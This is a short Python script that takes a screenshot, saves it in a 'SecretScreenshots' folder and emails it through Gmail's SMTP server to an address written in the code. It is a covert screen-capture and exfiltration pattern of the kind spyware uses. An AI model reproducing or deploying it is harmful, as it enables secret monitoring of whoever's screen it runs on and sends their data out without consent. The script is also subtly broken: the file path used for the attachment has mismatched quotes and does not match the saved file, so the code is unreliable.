from PIL import ImageGrab
from datetime import datetime
import smtplib
import imghdr
from email.message import EmailMessage


def screenshot():




    now = datetime.now()

    dt_string = now.strftime("%H.%M.%S")
    snapshot = ImageGrab.grab()
    save_path = "C:\\Users\\Christoffer\\Documents\\SecretScreenshots\\ss" +  dt_string + ".png"
    snapshot.save(save_path)

    Sender_Email = "cbrydensholt@gmail.com"
    Reciever_Email = "cbrydensholt@gmail.com"
    Password = "hidden"
    newMessage = EmailMessage()
    newMessage['Subject'] = "New screenshot arrived"
    newMessage['From'] = Sender_Email
    newMessage['To'] = Reciever_Email
    newMessage.set_content('New screenshot from time: ' + dt_string)
    with open('C:\\Users\\Christoffer\\Documents\\SecretScreenshots\\ss" +  dt_string + ".png', 'rb') as f:
        image_data = f.read()
        image_type = imghdr.what(f.name)
        image_name = f.name
    newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(Sender_Email, Password)
        smtp.send_message(newMessage)

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    screenshot()
